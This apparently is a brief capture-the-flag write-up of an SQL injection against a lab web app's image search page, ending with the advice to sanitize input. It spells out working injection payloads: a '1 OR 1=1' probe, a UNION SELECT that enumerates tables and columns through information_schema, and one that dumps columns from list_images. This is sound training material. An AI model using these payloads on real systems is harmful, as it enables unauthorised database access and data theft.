On `http://$IP/?page=searchimg`. type '1 OR 1=1' into search field, this indicates it can be exploited by sql injection.

We look for the list of table and there columns using:

```
1 AND false UNION SELECT table_name, column_name FROM information_schema.columns
```

We craft the last injection where we try all the columns, and We did it.

```
1 AND false UNION SELECT comment, title FROM list_images
```

---

> How to secure:
>
> -  Sanitize input.
